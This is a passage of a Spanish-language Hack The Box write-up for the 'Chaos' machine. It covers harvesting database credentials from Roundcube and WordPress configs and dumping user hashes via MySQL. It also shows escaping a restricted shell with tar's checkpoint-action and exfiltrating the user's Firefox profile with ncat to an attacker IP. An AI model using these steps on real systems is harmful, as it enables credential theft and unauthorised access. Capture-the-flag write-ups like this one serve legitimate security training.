	<Directory /var/www/roundcube>
		Options -Indexes
		AllowOverride All
		Order allow,deny
		allow from all
	</Directory>


</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Como podemos ver, se trataba de un subdominio de chaos.htb, **webmail.chaos.htb**.

Ahora, revisando la configuración de la aplicación encontramos algo interesante:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/roundcube/config/
<n9_H3r3/compile$ ls -lah /var/www/roundcube/config/
total 76K
drwxr-xr-x  2 www-data www-data 4.0K Oct 28  2018 .
drwxr-xr-x 13 www-data www-data 4.0K Oct 23  2018 ..
-rw-r--r--  1 www-data www-data  164 Oct 23  2018 .htaccess
-rw-r--r--  1 www-data www-data 2.3K Oct 28  2018 config.inc.php
-rw-r--r--  1 www-data www-data 4.0K Oct 23  2018 config.inc.php.sample
-rw-r--r--  1 www-data www-data  52K Oct 23  2018 defaults.inc.php
-rw-r--r--  1 www-data www-data 2.8K Oct 23  2018 mimetypes.php
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cat /var/www/roundcube/config/config.inc.php
<mpile$ cat /var/www/roundcube/config/config.inc.php
<?php

/* Local configuration for Roundcube Webmail */

// ----------------------------------
// SQL DATABASE
// ----------------------------------
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:inner%5BOnCag8@localhost/roundcubemail';

// you can define specific table (and sequence) names prefix
$config['db_prefix'] = 'rc_';

// ----------------------------------
// IMAP
// ----------------------------------
// The IMAP host chosen to perform the log-in.
// Leave blank to show a textbox at login, give a list of hosts
// to display a pulldown menu or set one host as string.
// To use SSL/TLS connection, enter hostname with prefix ssl:// or tls://
// Supported replacement variables:
// %n - hostname ($_SERVER['SERVER_NAME'])
// %t - hostname without the first part
// %d - domain (http hostname $_SERVER['HTTP_HOST'] without the first part)
// %s - domain name after the '@' from e-mail address provided at login screen
// For example %n = mail.domain.tld, %t = domain.tld
// WARNING: After hostname change update of mail_host column in users table is
//          required to match old user data records with the new host.
$config['default_host'] = 'localhost';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = 'chaos.htb';

// This key is used for encrypting purposes, like storing of imap password
// in the session. For historical reasons it's called DES_key, but it's used
// with any configured cipher_method (see below).
$config['des_key'] = 'ZcDl5ZmsXAPnaqyxJYVRT9C3';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'chaos';

// ----------------------------------
// PLUGINS
// ----------------------------------
// List of active plugins (in plugins/ directory)
$config['plugins'] = array();

www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cat /var/www/roundcube/config/config.inc.php  | grep -v '^/'
<www/roundcube/config/config.inc.php  | grep -v '^/'
<?php


$config['db_dsnw'] = 'mysql://roundcube:inner%5BOnCag8@localhost/roundcubemail';

$config['db_prefix'] = 'rc_';

$config['default_host'] = 'localhost';

$config['support_url'] = 'chaos.htb';

$config['des_key'] = 'ZcDl5ZmsXAPnaqyxJYVRT9C3';

$config['product_name'] = 'chaos';

$config['plugins'] = array();

www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
```

Nice, ahora tenemos unas credenciales de mysql para explorar.

No sin antes cambiar, recordemos que también la aplicación de wordpress debe declarar una base de datos en la instalación:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/html/wp/wordpress/
<9_H3r3/compile$ ls -lah /var/www/html/wp/wordpress/
total 204K
drwxr-xr-x  5 root root 4.0K Nov 25 00:38 .
drwxr-xr-x  3 root root 4.0K Oct 28  2018 ..
-rw-r--r--  1 root root  418 Sep 25  2013 index.php
-rw-r--r--  1 root root  20K Jan  6  2018 license.txt
-rw-r--r--  1 root root 7.3K Mar 18  2018 readme.html
-rw-r--r--  1 root root 5.4K May  1  2018 wp-activate.php
drwxr-xr-x  9 root root 4.0K Aug  2  2018 wp-admin
-rw-r--r--  1 root root  364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 root root 1.9K May  2  2018 wp-comments-post.php
-rw-r--r--  1 root root 2.8K Dec 16  2015 wp-config-sample.php
-rw-r--r--  1 root root 3.0K Nov 25 00:19 wp-config.php
drwxr-xr-x  4 root root 4.0K Aug  2  2018 wp-content
-rw-r--r--  1 root root 3.6K Aug 20  2017 wp-cron.php
drwxr-xr-x 18 root root  12K Aug  2  2018 wp-includes
-rw-r--r--  1 root root 2.4K Nov 21  2016 wp-links-opml.php
-rw-r--r--  1 root root 3.3K Aug 22  2017 wp-load.php
-rw-r--r--  1 root root  37K Jul 16  2018 wp-login.php
-rw-r--r--  1 root root 7.9K Jan 11  2017 wp-mail.php
-rw-r--r--  1 root root  16K Oct  4  2017 wp-settings.php
-rw-r--r--  1 root root  30K Apr 29  2018 wp-signup.php
-rw-r--r--  1 root root 4.6K Oct 23  2017 wp-trackback.php
-rw-r--r--  1 root root 3.0K Aug 31  2016 xmlrpc.php
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cat /var/www/html/wp/wordpress/wp-config.php | grep -Ev '^/|^.\*|^$'
</wp/wordpress/wp-config.php | grep -Ev '^/|^.\*|^$'
<?php

define('DB_NAME', 'wp');

define('DB_USER', 'roundcube');

define('DB_PASSWORD', 'inner[OnCag8');

define('DB_HOST', 'localhost');

define('DB_CHARSET', 'utf8');

define('DB_COLLATE', '');

define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');


$table_prefix  = 'wp_';

define('WP_DEBUG', false);


if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

require_once(ABSPATH . 'wp-settings.php');

if (isset( $_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $mte_xffaddrs = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $mte_xffaddrs[0];
}
```

Consolidemos la información que acabamos de obtener del servicio de DB:

| DB Name       | DB Host   | DB User   | DB Pass      | Notes                                  |
|---------------|-----------|-----------|--------------|----------------------------------------|
| roundcubemail | localhost | roundcube | inner[OnCag8 | rc_ , DES_KEY:ZcDl5ZmsXAPnaqyxJYVRT9C3 |
| wp            | localhost | roundcube | inner[OnCag8 | wp_ , utf8                             |

Exploremos ahora mysql:

```text
www-data@chaos:/var/www/roundcube/config$ mysql -u roundcube -h localhost -p
mysql -u roundcube -h localhost -p
Enter password: inner[OnCag8

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.24-0ubuntu0.18.10.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcubemail      |
| wp                 |
+--------------------+
3 rows in set (0.00 sec)

mysql> use roundcubemail;
use roundcubemail;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------+
| Tables_in_roundcubemail |
+-------------------------+
| cache                   |
| cache_index             |
| cache_messages          |
| cache_shared            |
| cache_thread            |
| contactgroupmembers     |
| contactgroups           |
| contacts                |
| dictionary              |
| identities              |
| rc_cache                |
| rc_cache_index          |
| rc_cache_messages       |
| rc_cache_shared         |
| rc_cache_thread         |
| rc_contactgroupmembers  |
| rc_contactgroups        |
| rc_contacts             |
| rc_dictionary           |
| rc_identities           |
| rc_searches             |
| rc_session              |
| rc_system               |
| rc_users                |
| searches                |
| session                 |
| system                  |
| users                   |
+-------------------------+
28 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
Empty set (0.00 sec)

mysql> select * from rc_users;
select * from rc_users;
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
|       1 | ayush    | localhost | 2018-10-28 12:10:08 | 2018-10-28 12:17:40 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"RtiFliMyCQJHsnsS";} |
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
1 row in set (0.00 sec)

mysql> use wp;
use wp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email     | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | human      | $P$BSl/JcSO/ofPD.t/2u8ANTcqtIBX5G/ | human         | info@chaos.htb |          | 2018-10-28 11:32:57 |                     |           0 | human        |
+----+------------+------------------------------------+---------------+----------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

mysql>
```

## Keep it simple.

Como podemos ver aquí hay un callejón muerto. Ponernos a romper el hash es muy tardado, sabemos que el hash de ayush es igual a `jiujitsu`. Momento, aun no hemos probado cambiar de www-data a ayush con las credenciales del servicio:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su - ayush
su - ayush
Password: jiujitsu

ayush@chaos:~$
```

Y hemos escalado de www-data a ayush.

# Escape from restricted shell

Al llegar a ayush nos daremos cuenta que no tenemos una shell completa:

```text
ayush@chaos:~$ ls -lah
ls -lah
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
ayush@chaos:~$ cd ..
cd ..
ayush@chaos:/home$ cd
cd
ayush@chaos:~$ dir
dir
mail  user.txt
ayush@chaos:~$ dir -R
dir -R
.:
mail  user.txt

./mail:
Drafts	Sent
```

Parece que faltan algunos comandos (ls no pero dir si, que es esto, windows?). Veamos que dicen las variables de entorno:

```text
ayush@chaos:~$ echo $PATH
echo $PATH
/home/ayush/.app
ayush@chaos:~$ dir /home/ayush/.app
dir /home/ayush/.app
dir  ping  tar
```

Parece que solo podemos trabajar con estos tres comandos: `dir`, `ping` y `tar`.

No hay problema, [google nos ayuda a escalar](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) encontrando como usar `tar` como pivote:

```text
ayush@chaos:~$ tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh
<ile --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: testfile: Cannot stat: No such file or directory
$
```

Yeah, ahora nada nos detendrá!

```text
$ id
id
/bin/sh: 1: id: not found
$ bash
bash
/bin/sh: 2: bash: not found
$ env
env
```

Bueno tal vez la variable $PATH:

```text
$ export PATH="/usr/local/bin:/usr/bin:/bin"
export PATH="/usr/local/bin:/usr/bin:/bin"
$ ls
ls
ayush  sahay
$ bash
bash
ayush@chaos:/home$ ls
ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
ayush@chaos:/home$ export PATH="/usr/local/bin:/usr/bin:/bin"
export PATH="/usr/local/bin:/usr/bin:/bin"
ayush@chaos:/home$ ls
ls
ayush  sahay
ayush@chaos:/home$ ls -lah
ls -lah
total 16K
drwxr-xr-x  4 root  root  4.0K Oct 28 11:34 .
drwxr-xr-x 22 root  root  4.0K Dec  9 17:19 ..
drwx------  6 ayush ayush 4.0K Apr 27 06:50 ayush
drwx------  5 sahay sahay 4.0K Nov 24 23:53 sahay
ayush@chaos:/home$ cd ayush
cd ayush
ayush@chaos:~$ ls -lah
ls -lah
total 40K
drwx------ 6 ayush ayush 4.0K Apr 27 06:50 .
drwxr-xr-x 4 root  root  4.0K Oct 28 11:34 ..
drwxr-xr-x 2 root  root  4.0K Oct 28 12:25 .app
-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28 11:34 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28 12:27 .bashrc
drwx------ 3 ayush ayush 4.0K Apr 27 06:50 .gnupg
drwx------ 3 ayush ayush 4.0K Apr 27 05:40 mail
drwx------ 4 ayush ayush 4.0K Sep 29  2018 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28 11:34 .profile
-rw------- 1 ayush ayush   33 Oct 28 12:54 user.txt
```

# cat user.txt

Desde el home de ayush ejecutamos el cat de user.txt:

```text
ayush@chaos:~$ cat user.txt
```

# Privilege Escalation from ayush to r??t

Primero y entre otras cosas, veamos que tanto tenemos en el directorio de ayush:

```text
ayush@chaos:~$ ls -laR
ls -laR
.:
total 40
drwx------ 6 ayush ayush 4096 Apr 27 06:50 .
drwxr-xr-x 4 root  root  4096 Oct 28 11:34 ..
drwxr-xr-x 2 root  root  4096 Oct 28 12:25 .app
-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28 11:34 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28 12:27 .bashrc
drwx------ 3 ayush ayush 4096 Apr 27 06:50 .gnupg
drwx------ 3 ayush ayush 4096 Apr 27 05:40 mail
drwx------ 4 ayush ayush 4096 Sep 29  2018 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28 11:34 .profile
-rw------- 1 ayush ayush   33 Oct 28 12:54 user.txt

./.app:
total 8
drwxr-xr-x 2 root  root  4096 Oct 28 12:25 .
drwx------ 6 ayush ayush 4096 Apr 27 06:50 ..
lrwxrwxrwx 1 root  root     8 Oct 28 12:25 dir -> /bin/dir
lrwxrwxrwx 1 root  root     9 Oct 28 12:25 ping -> /bin/ping
lrwxrwxrwx 1 root  root     8 Oct 28 12:25 tar -> /bin/tar

./.gnupg:
total 12
drwx------ 3 ayush ayush 4096 Apr 27 06:50 .
drwx------ 6 ayush ayush 4096 Apr 27 06:50 ..
drwx------ 2 ayush ayush 4096 Apr 27 06:50 private-keys-v1.d

./.gnupg/private-keys-v1.d:
total 8
drwx------ 2 ayush ayush 4096 Apr 27 06:50 .
drwx------ 3 ayush ayush 4096 Apr 27 06:50 ..

./mail:
total 20
drwx------ 3 ayush ayush 4096 Apr 27 05:40 .
drwx------ 6 ayush ayush 4096 Apr 27 06:50 ..
-rw------- 1 ayush ayush 2638 Oct 28 12:16 Drafts
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .imap
-rw------- 1 ayush ayush    0 Oct 28 12:10 Sent
-rw------- 1 ayush ayush   17 Oct 28 12:13 .subscriptions

./mail/.imap:
total 32
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .
drwx------ 3 ayush ayush 4096 Apr 27 05:40 ..
-rw------- 1 ayush ayush 4028 Oct 28 12:16 dovecot.list.index.log
-rw------- 1 ayush ayush   48 Oct 28 12:13 dovecot.mailbox.log
-rw------- 1 ayush ayush    8 Oct 28 12:13 dovecot-uidvalidity
-r--r--r-- 1 ayush ayush    0 Oct 28 12:10 dovecot-uidvalidity.5bd5a723
drwx------ 2 ayush ayush 4096 Oct 28 12:13 Drafts
drwx------ 2 ayush ayush 4096 Oct 28 12:10 INBOX
drwx------ 2 ayush ayush 4096 Oct 28 12:10 Sent

./mail/.imap/Drafts:
total 20
drwx------ 2 ayush ayush 4096 Oct 28 12:13 .
drwx------ 5 ayush ayush 4096 Oct 28 12:13 ..
-rw------- 1 ayush ayush 5296 Apr 27 05:41 dovecot.index.cache
-rw------- 1 ayush ayush 3220 Oct 28 12:16 dovecot.index.log

./mail/.imap/INBOX:
total 12
drwx------ 2 ayush ayush 4096 Oct 28 12:10 .
drwx------ 5 ayush ayush 4096 Oct 28 12:13 ..
-rw------- 1 ayush ayush  304 Apr 27 05:32 dovecot.index.log

./mail/.imap/Sent:
total 12
drwx------ 2 ayush ayush 4096 Oct 28 12:10 .
drwx------ 5 ayush ayush 4096 Oct 28 12:13 ..
-rw------- 1 ayush ayush  232 Oct 28 12:10 dovecot.index.log

./.mozilla:
total 16
drwx------ 4 ayush ayush 4096 Sep 29  2018 .
drwx------ 6 ayush ayush 4096 Apr 27 06:50 ..
drwx------ 2 ayush ayush 4096 Sep 29  2018 extensions
drwx------ 4 ayush ayush 4096 Sep 29  2018 firefox

./.mozilla/extensions:
total 8
drwx------ 2 ayush ayush 4096 Sep 29  2018 .
drwx------ 4 ayush ayush 4096 Sep 29  2018 ..

./.mozilla/firefox:
total 20
drwx------  4 ayush ayush 4096 Sep 29  2018  .
drwx------  4 ayush ayush 4096 Sep 29  2018  ..
drwx------ 10 ayush ayush 4096 Oct 27 13:59  bzo7sjt1.default
drwx------  4 ayush ayush 4096 Oct 15  2018 'Crash Reports'
-rw-r--r--  1 ayush ayush  104 Sep 29  2018  profiles.ini

./.mozilla/firefox/bzo7sjt1.default:
total 14424
drwx------ 10 ayush ayush     4096 Oct 27 13:59 .
drwx------  4 ayush ayush     4096 Sep 29  2018 ..
-rw-------  1 ayush ayush       24 Oct 27 12:08 addons.json
-rw-r--r--  1 ayush ayush      222 Oct 27 12:10 AlternateServices.txt
-rw-------  1 ayush ayush   571824 Oct 11  2018 blocklist-addons.json
-rw-------  1 ayush ayush    27953 Oct  7  2018 blocklist-gfx.json
-rw-------  1 ayush ayush   139100 Oct  7  2018 blocklist-plugins.json
-rw-------  1 ayush ayush   429735 Oct 25  2018 blocklist.xml
drwx------  2 ayush ayush     4096 Oct 27 14:00 bookmarkbackups
-rw-------  1 ayush ayush    94208 Oct 27 12:09 cert9.db
-rw-------  1 ayush ayush      362 Oct 27 12:09 cert_override.txt
-rw-------  1 ayush ayush      170 Sep 29  2018 compatibility.ini
-rw-------  1 ayush ayush      809 Sep 29  2018 containers.json
-rw-r--r--  1 ayush ayush   229376 Oct 24  2018 content-prefs.sqlite
-rw-r--r--  1 ayush ayush   524288 Oct 27 12:10 cookies.sqlite
-rw-r--r--  1 ayush ayush    32768 Oct 27 13:55 cookies.sqlite-shm
-rw-r--r--  1 ayush ayush        0 Oct 27 13:55 cookies.sqlite-wal
drwx------  3 ayush ayush     4096 Oct 27 13:55 crashes
drwx------  3 ayush ayush     4096 Oct 27 14:00 datareporting
-rw-r--r--  1 ayush ayush      167 Sep 29  2018 extensions.ini
-rw-------  1 ayush ayush     5687 Oct 27 13:55 extensions.json
-rw-r--r--  1 ayush ayush   196608 Oct 24  2018 formhistory.sqlite
drwx------  3 ayush ayush     4096 Sep 29  2018 gmp
-rw-------  1 ayush ayush    36864 Oct 27 13:55 key4.db
-rw-r--r--  1 ayush ayush  1343488 Oct 11  2018 kinto.sqlite
-rw-------  1 ayush ayush      570 Oct 27 12:10 logins.json
-rw-r--r--  1 ayush ayush     3777 Sep 29  2018 mimeTypes.rdf
drwx------  2 ayush ayush     4096 Oct 25  2018 minidumps
-rw-r--r--  1 root  root         0 Oct 27 13:54 .parentlock
-rw-r--r--  1 ayush ayush    98304 Sep 29  2018 permissions.sqlite
-rw-------  1 ayush ayush      868 Sep 29  2018 pkcs11.txt
-rw-r--r--  1 ayush ayush 10485760 Oct 27 13:59 places.sqlite
-rw-r--r--  1 ayush ayush    32768 Oct 27 14:08 places.sqlite-shm
-rw-r--r--  1 ayush ayush    32824 Oct 27 14:08 places.sqlite-wal
-rw-------  1 ayush ayush      469 Sep 29  2018 pluginreg.dat
-rw-------  1 ayush ayush    12163 Oct 27 13:59 prefs.js
-rw-r--r--  1 ayush ayush    43369 Oct 11  2018 revocations.txt
drwx------  2 ayush ayush     4096 Oct 26  2018 saved-telemetry-pings
-rw-------  1 ayush ayush    17004 Sep 29  2018 search.json.mozlz4
-rw-r--r--  1 ayush ayush        0 Oct 27 12:10 SecurityPreloadState.txt
-rw-------  1 ayush ayush       90 Oct 27 13:54 sessionCheckpoints.json
drwx------  2 ayush ayush     4096 Oct 27 13:55 sessionstore-backups
-rw-r--r--  1 ayush ayush     5377 Oct 27 14:00 SiteSecurityServiceState.txt
drwxr-xr-x  5 ayush ayush     4096 Oct  9  2018 storage
-rw-r--r--  1 ayush ayush      512 Sep 29  2018 storage.sqlite
-rwx------  1 ayush ayush       29 Sep 29  2018 times.json
-rw-r--r--  1 ayush ayush   262144 Oct 27 12:10 webappsstore.sqlite
-rw-r--r--  1 ayush ayush    32768 Oct 27 13:54 webappsstore.sqlite-shm
-rw-r--r--  1 ayush ayush        0 Oct 27 13:54 webappsstore.sqlite-wal
-rw-------  1 ayush ayush     1099 Oct 27 13:55 xulstore.json

./.mozilla/firefox/bzo7sjt1.default/bookmarkbackups:
total 16
drwx------  2 ayush ayush 4096 Oct 27 14:00  .
drwx------ 10 ayush ayush 4096 Oct 27 13:59  ..
-rw-------  1 root  root  2035 Sep 29  2018 'bookmarks-2018-09-29_23_KNEJR-waZJZwUVshUNhFqg==.jsonlz4'
-rw-------  1 root  root  2170 Oct 27 14:00 'bookmarks-2018-10-27_24_0UTpOFh1V6tsL2fi6cyvng==.jsonlz4'

./.mozilla/firefox/bzo7sjt1.default/crashes:
total 16
drwx------  3 ayush ayush 4096 Oct 27 13:55 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..
drwx------  2 root  root  4096 Sep 29  2018 events
-rw-------  1 root  root   225 Oct 27 13:55 store.json.mozlz4
ls: cannot open directory './.mozilla/firefox/bzo7sjt1.default/crashes/events': Permission denied

./.mozilla/firefox/bzo7sjt1.default/datareporting:
total 32
drwx------  3 ayush ayush 4096 Oct 27 14:00 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..
-rw-------  1 root  root  9347 Oct 27 14:00 aborted-session-ping
drwx------  4 root  root  4096 Oct  2  2018 archived
-rw-------  1 root  root   136 Oct 27 13:55 session-state.json
-rw-------  1 root  root    51 Sep 29  2018 state.json
ls: cannot open directory './.mozilla/firefox/bzo7sjt1.default/datareporting/archived': Permission denied

./.mozilla/firefox/bzo7sjt1.default/gmp:
total 12
drwx------  3 ayush ayush 4096 Sep 29  2018 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..
drwx------  2 root  root  4096 Sep 29  2018 Linux_x86_64-gcc3
ls: cannot open directory './.mozilla/firefox/bzo7sjt1.default/gmp/Linux_x86_64-gcc3': Permission denied

./.mozilla/firefox/bzo7sjt1.default/minidumps:
total 8
drwx------  2 ayush ayush 4096 Oct 25  2018 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..

./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings:
total 44
drwx------  2 ayush ayush 4096 Oct 26  2018 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..
-rw-------  1 root  root  9789 Sep 29  2018 b35e9f24-a4a9-4683-b4ec-1fdaf3533a7a
-rw-------  1 root  root  9162 Oct 26  2018 dc2f3e22-3710-4da9-9d30-c01f0885a480
-rw-------  1 root  root  9933 Oct  6  2018 f153dbe5-b2e1-46ad-bb38-d0d2e22ab3fe

./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups:
total 196
drwx------  2 ayush ayush  4096 Oct 27 13:55 .
drwx------ 10 ayush ayush  4096 Oct 27 13:59 ..
-rw-------  1 root  root  39550 Oct 27 12:10 previous.js
-rw-------  1 root  root  42537 Oct 27 13:55 recovery.bak
-rw-------  1 root  root  43650 Oct 27 13:55 recovery.js
-rw-------  1 root  root  57967 Sep 29  2018 upgrade.js-20180326230345

./.mozilla/firefox/bzo7sjt1.default/storage:
total 20
drwxr-xr-x  5 ayush ayush 4096 Oct  9  2018 .
drwx------ 10 ayush ayush 4096 Oct 27 13:59 ..
drwxr-xr-x  3 root  root  4096 Oct  9  2018 default
drwxr-xr-x  3 root  root  4096 Sep 29  2018 permanent
drwxr-xr-x  2 root  root  4096 Oct  9  2018 temporary

./.mozilla/firefox/bzo7sjt1.default/storage/default:
total 12
drwxr-xr-x 3 root  root  4096 Oct  9  2018 .
drwxr-xr-x 5 ayush ayush 4096 Oct  9  2018 ..
drwxr-xr-x 3 root  root  4096 Oct  9  2018 https+++www.google.com

./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com:
total 20
drwxr-xr-x 3 root root 4096 Oct  9  2018 .
drwxr-xr-x 3 root root 4096 Oct  9  2018 ..
drwxr-xr-x 3 root root 4096 Oct 27 13:59 idb
-rw-r--r-- 1 root root   49 Oct  9  2018 .metadata
-rw-r--r-- 1 root root   62 Oct 24  2018 .metadata-v2

./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb:
total 60
drwxr-xr-x 3 root root  4096 Oct 27 13:59 .
drwxr-xr-x 3 root root  4096 Oct  9  2018 ..
drwxr-xr-x 2 root root  4096 Oct  9  2018 548905059db.files
-rw-r--r-- 1 root root 49152 Oct  9  2018 548905059db.sqlite

./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/548905059db.files:
total 8
drwxr-xr-x 2 root root 4096 Oct  9  2018 .
drwxr-xr-x 3 root root 4096 Oct 27 13:59 ..

./.mozilla/firefox/bzo7sjt1.default/storage/permanent:
total 12
drwxr-xr-x 3 root  root  4096 Sep 29  2018 .
drwxr-xr-x 5 ayush ayush 4096 Oct  9  2018 ..
drwxr-xr-x 3 root  root  4096 Sep 29  2018 chrome

./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome:
total 20
drwxr-xr-x 3 root root 4096 Sep 29  2018 .
drwxr-xr-x 3 root root 4096 Sep 29  2018 ..
drwxr-xr-x 3 root root 4096 Oct 27 14:00 idb
-rw-r--r-- 1 root root   29 Sep 29  2018 .metadata
-rw-r--r-- 1 root root   42 Sep 29  2018 .metadata-v2

./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb:
total 60
drwxr-xr-x 3 root root  4096 Oct 27 14:00 .
drwxr-xr-x 3 root root  4096 Sep 29  2018 ..
drwxr-xr-x 2 root root  4096 Sep 29  2018 2918063365piupsah.files
-rw-r--r-- 1 root root 49152 Sep 29  2018 2918063365piupsah.sqlite

./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/2918063365piupsah.files:
total 8
drwxr-xr-x 2 root root 4096 Sep 29  2018 .
drwxr-xr-x 3 root root 4096 Oct 27 14:00 ..

./.mozilla/firefox/bzo7sjt1.default/storage/temporary:
total 8
drwxr-xr-x 2 root  root  4096 Oct  9  2018 .
drwxr-xr-x 5 ayush ayush 4096 Oct  9  2018 ..

'./.mozilla/firefox/Crash Reports':
total 20
drwx------ 4 ayush ayush 4096 Oct 15  2018 .
drwx------ 4 ayush ayush 4096 Sep 29  2018 ..
drwx------ 2 root  root  4096 Sep 29  2018 events
-rw------- 1 root  root    10 Sep 29  2018 InstallTime20180326230345
drwxr-xr-x 2 root  root  4096 Oct 25  2018 pending
ls: cannot open directory './.mozilla/firefox/Crash Reports/events': Permission denied

'./.mozilla/firefox/Crash Reports/pending':
total 2704
drwxr-xr-x 2 root  root     4096 Oct 25  2018 .
drwx------ 4 ayush ayush    4096 Oct 15  2018 ..
-rw------- 1 root  root   919576 Oct 15  2018 1e2e493c-1aef-e727-52fdaccf-6a5db42b-browser.dmp
-rw------- 1 root  root   404352 Oct 15  2018 1e2e493c-1aef-e727-52fdaccf-6a5db42b.dmp
-rw------- 1 root  root     5414 Oct 15  2018 1e2e493c-1aef-e727-52fdaccf-6a5db42b.extra
-rw------- 1 root  root  1001112 Oct 25  2018 2a28d0d2-415e-203f-25015edd-362ac19e-browser.dmp
-rw------- 1 root  root   411576 Oct 25  2018 2a28d0d2-415e-203f-25015edd-362ac19e.dmp
-rw------- 1 root  root     5184 Oct 25  2018 2a28d0d2-415e-203f-25015edd-362ac19e.extra
```

Básicamente tenemos tres directorios interesantes en $home, el primero es `.mozila`, el segundo es `.gnupg` y finalmente `.mail`. El primero es el más interesante porque hasta donde he podido resolver maquinas en HTB, casi nunca hay rastros de aplicaciones de escritorio.

Me lleve este directorio fuera para poderlo trabajar mas comodamente:

```text
ayush@chaos:~$ tar cvz ./.mozilla/firefox/bzo7sjt1.default/ | ncat --send-only 10.10.14.12 4001
<o7sjt1.default/ | ncat --send-only 10.10.14.12 4001
./.mozilla/firefox/bzo7sjt1.default/
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite
./.mozilla/firefox/bzo7sjt1.default/places.sqlite
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite
./.mozilla/firefox/bzo7sjt1.default/permissions.sqlite
